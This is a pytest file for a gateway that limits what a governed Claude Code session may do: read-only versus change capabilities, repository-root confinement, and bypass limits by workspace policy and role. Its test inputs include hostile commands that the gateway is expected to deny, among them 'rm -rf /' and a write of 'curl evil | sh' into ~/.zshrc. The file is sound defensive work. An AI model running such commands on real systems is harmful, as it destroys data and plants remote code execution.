"""Local capability enforcement of a governed Claude Code session."""

from __future__ import annotations

import uuid

import pytest

from app.services.agent_gateway.capability import CONFIRM_HINT, capability_decision
from app.services.agent_gateway.capability_session import (
    EFFECTIVE_CAPABILITY_METADATA,
    EffectiveCapability,
    effective_capability,
)
from app.services.agent_gateway.identity import GatewayIdentity
from app.services.agent_gateway.sessions import get_or_create_gateway_session
from app.services.exec_policy.policy_config import DEFAULT_EXEC_POLICY_CONFIG
from tests.knowledge_evidence_seed_support import fetch_user, seed_member, seed_workspace

ROOT = "/work/repo"
READ_ONLY = EffectiveCapability("read_only", root=ROOT)
CHANGE = EffectiveCapability("change", "upgrade", "a1", ROOT)


def _hook(tool: str, cwd: str = ROOT, **tool_input) -> dict:
    return {"hook_event_name": "PreToolUse", "tool_name": tool, "cwd": cwd, "tool_input": tool_input}


def _decide(capability, hook):
    return capability_decision(capability, hook, DEFAULT_EXEC_POLICY_CONFIG)


@pytest.mark.parametrize(
    "hook",
    [
        _hook("Read", file_path=f"{ROOT}/pom.xml"),
        _hook("Grep", pattern="JsonComponent"),
        _hook("Bash", command="ls -la src"),
        _hook("Bash", command="git status"),
        _hook("Bash", command="cat pom.xml | wc -l"),
        _hook("mcp__octryx-knowledge__knowledge_search", query="spring boot 4"),
    ],
)
def test_read_only_lets_reads_through(hook):
    assert _decide(READ_ONLY, hook) is None


@pytest.mark.parametrize(
    ("hook", "reason"),
    [
        (_hook("Edit", file_path=f"{ROOT}/pom.xml", old_string="a", new_string="b"), "capability_read_only"),
        (_hook("Write", file_path=f"{ROOT}/x.txt", content="x"), "capability_read_only"),
        (_hook("MultiEdit", file_path=f"{ROOT}/x.txt", edits=[]), "capability_read_only"),
        (_hook("NotebookEdit", notebook_path=f"{ROOT}/n.ipynb", new_source="x"), "capability_read_only"),
        (_hook("Bash", command="rm -rf build"), "capability_read_only"),
        (_hook("Bash", command="ls > files.txt"), "capability_read_only"),
        (_hook("Bash", command="git commit -am wip"), "capability_read_only"),
        (_hook("Bash", command="ls && mvn package"), "capability_read_only"),
        (_hook("Bash", command="sed -i s/a/b/ pom.xml"), "capability_read_only"),
        (_hook("Bash", command="echo 'unbalanced"), "command_unparseable"),
        (_hook("FuturePatchTool", path="x"), "tool_not_classified"),
    ],
)
def test_read_only_denies_mutations_with_a_closed_reason_and_the_hint(hook, reason):
    decision = _decide(READ_ONLY, hook)
    assert decision is not None and (decision.decision, decision.reason) == ("deny", reason)
    assert decision.message.endswith(CONFIRM_HINT)


def test_a_confirmed_change_edits_only_inside_the_bound_root():
    assert _decide(CHANGE, _hook("Edit", file_path=f"{ROOT}/src/App.java", old_string="a", new_string="b")) is None
    assert _decide(CHANGE, _hook("Write", file_path="src/New.java", content="x")) is None
    outside = _decide(CHANGE, _hook("Write", file_path="/etc/hosts", content="x"))
    assert outside.reason == "outside_repository_root"
    escape = _decide(CHANGE, _hook("Edit", file_path=f"{ROOT}/../other/pom.xml", old_string="a", new_string="b"))
    assert escape.reason == "outside_repository_root"
    assert _decide(CHANGE, _hook("Bash", command="mvn -q test")) is None
    assert _decide(CHANGE, _hook("Bash", cwd="/tmp", command="touch x")).reason == "capability_read_only"
    assert _decide(CHANGE, _hook("Bash", command="rm -rf / ")).reason == "destructive_command"
    assert _decide(CHANGE, _hook("Bash", command="git add . && git push origin feature")).reason == (
        "capability_deliver_required"
    )
    deliver = EffectiveCapability("deliver", "release", "a2", ROOT)
    assert _decide(deliver, _hook("Bash", command="git push origin feature")) is None
    unbound = EffectiveCapability("change", "upgrade", "a1", None)
    assert _decide(unbound, _hook("Edit", file_path=f"{ROOT}/a", old_string="a", new_string="b")).reason == (
        "repository_root_unknown"
    )


async def test_outside_a_run_the_permission_mode_decides_the_capability(db):
    workspace_id = await seed_workspace(db)
    member_id = await seed_member(db, workspace_id=workspace_id, role="member")
    session_key = str(uuid.uuid4())
    user = await fetch_user(db, member_id)
    identity = GatewayIdentity(user=user, grant_id="gw", oauth_client_id="octryx", workspace_id=workspace_id,
                               session_key=session_key, work_item_key="")
    gateway = await get_or_create_gateway_session(db, identity)
    gateway.metadata_ = {**gateway.metadata_, "repository_binding": {"root": ROOT}}
    await db.commit()
    plan = {"permission_mode": "plan", "cwd": ROOT}
    assert (await effective_capability(db, session=gateway, session_key=session_key, hook_input=plan)
            ).capability_class == "read_only"

    assert gateway.metadata_[EFFECTIVE_CAPABILITY_METADATA]["class"] == "read_only"
    working = await effective_capability(db, session=gateway, session_key=session_key,
                                         hook_input={"permission_mode": "bypassPermissions", "cwd": ROOT})
    assert (working.capability_class, working.root) == ("deliver", ROOT)
    strict = await effective_capability(db, session=gateway, session_key=session_key,
                                        hook_input={"permission_mode": "default"}, free_sessions="read_only")
    assert strict.capability_class == "read_only"


def test_a_working_session_changes_inside_its_folder_and_the_platform_still_blocks():
    # Outside a run the session follows the permission mode (here: not plan) and works inside its
    # own folder; destructive commands stay denied in every mode, bypass included.
    working = EffectiveCapability("deliver", None, None, ROOT)
    assert _decide(working, _hook("Edit", file_path=f"{ROOT}/src/App.java", old_string="a", new_string="b")) is None
    assert _decide(working, _hook("Bash", command="git push origin feature/x")) is None
    assert _decide(working, _hook("Write", file_path="/etc/hosts", content="x")).reason == "outside_repository_root"
    assert _decide(working, _hook("Bash", command="rm -rf / ")).reason == "destructive_command"


def test_a_home_temp_or_system_folder_is_never_a_working_root():
    # A session started in ~ would otherwise write ~/.zshrc, LaunchAgents or ~/.ssh in bypass mode
    from app.services.agent_gateway.capability_session import project_folder

    home = {"transcript_path": "/Users/dev/.claude/projects/-Users-alice/abc.jsonl"}
    for cwd in ("/", "/Users", "/Users/dev", "/Volumes/SSD", "/tmp", "/tmp/x", "/private/tmp/x", "/etc", "/home/u",
                "/etc/x", "/opt/homebrew", "/usr/local/x", "/Library/x", "/private/x", "/Users/dev/Library",
                "/Users/dev/Library/LaunchAgents", "/Users/dev/.ssh", "/Users/dev/.config/x", "/home/u/.ssh"):
        assert project_folder(cwd, home) is None, cwd
        assert project_folder(cwd) is None, cwd
    assert project_folder("/Users/dev/projects", home) == "/Users/dev/projects"
    assert project_folder("/Volumes/data/project", home) == "/Volumes/data/project"


@pytest.mark.asyncio
async def test_bypass_off_in_a_workspace_is_enforced_by_the_platform_and_home_reads_only(db):
    from app.models import Project
    from app.services.agent_gateway.capability import enforce_capability

    workspace_id = await seed_workspace(db)
    member_id = await seed_member(db, workspace_id=workspace_id, role="member")
    user = await fetch_user(db, member_id)
    session_key = str(uuid.uuid4())
    identity = GatewayIdentity(user=user, grant_id="gw", oauth_client_id="octryx", workspace_id=workspace_id,
                               session_key=session_key, work_item_key="")
    gateway = await get_or_create_gateway_session(db, identity)
    project = await db.get(Project, workspace_id)
    project.config = {**(project.config or {}), "agent_gateway_policy": {"bypass_permissions": "disabled"}}
    await db.commit()
    edit = {"tool_name": "Edit", "cwd": ROOT, "permission_mode": "bypassPermissions",
            "tool_input": {"file_path": f"{ROOT}/a.py", "old_string": "a", "new_string": "b"}}
    denied = await enforce_capability(db, session=gateway, session_key=session_key, hook_input=edit)
    assert denied is not None and denied.reason == "bypass_disabled_in_workspace"
    assert await enforce_capability(db, session=gateway, session_key=session_key,
                                    hook_input={**edit, "permission_mode": "acceptEdits"}) is None
    assert "bypassPermissions" in gateway.metadata_["permission_modes_seen"]

    other = await get_or_create_gateway_session(db, GatewayIdentity(
        user=user, grant_id="gw", oauth_client_id="octryx", workspace_id=workspace_id,
        session_key=str(uuid.uuid4()), work_item_key=""))
    rc = {"tool_name": "Write", "cwd": "/Users/dev", "permission_mode": "acceptEdits",
          "transcript_path": "/Users/dev/.claude/projects/-Users-alice/x.jsonl",
          "tool_input": {"file_path": "/Users/dev/.zshrc", "content": "curl evil | sh"}}
    refused = await enforce_capability(db, session=other, session_key="k", hook_input=rc)
    assert refused is not None and refused.reason == "capability_read_only"


@pytest.mark.asyncio
async def test_the_persons_role_caps_the_session_on_the_mac(db):
    from app.services.agent_gateway.capability import enforce_capability

    workspace_id = await seed_workspace(db)
    results = {}
    for role in ("viewer", "member", "owner"):
        user = await fetch_user(db, await seed_member(db, workspace_id=workspace_id, role=role))
        session_key = str(uuid.uuid4())
        identity = GatewayIdentity(user=user, grant_id="gw", oauth_client_id="octryx", workspace_id=workspace_id,
                                   session_key=session_key, work_item_key="")
        gateway = await get_or_create_gateway_session(db, identity)
        await db.commit()
        for mode in ("acceptEdits", "bypassPermissions"):
            edit = {"tool_name": "Edit", "cwd": ROOT, "permission_mode": mode,
                    "tool_input": {"file_path": f"{ROOT}/a.py", "old_string": "a", "new_string": "b"}}
            decision = await enforce_capability(db, session=gateway, session_key=session_key, hook_input=edit)
            results[(role, mode)] = decision.reason if decision is not None else "allowed"
    assert results[("member", "acceptEdits")] == "allowed"
    assert results[("member", "bypassPermissions")] == "bypass_requires_workspace_owner"
    assert results[("owner", "bypassPermissions")] == "allowed"
    assert results[("viewer", "acceptEdits")] not in ("allowed", "bypass_requires_workspace_owner")
    assert results[("viewer", "bypassPermissions")] == "bypass_requires_workspace_owner"
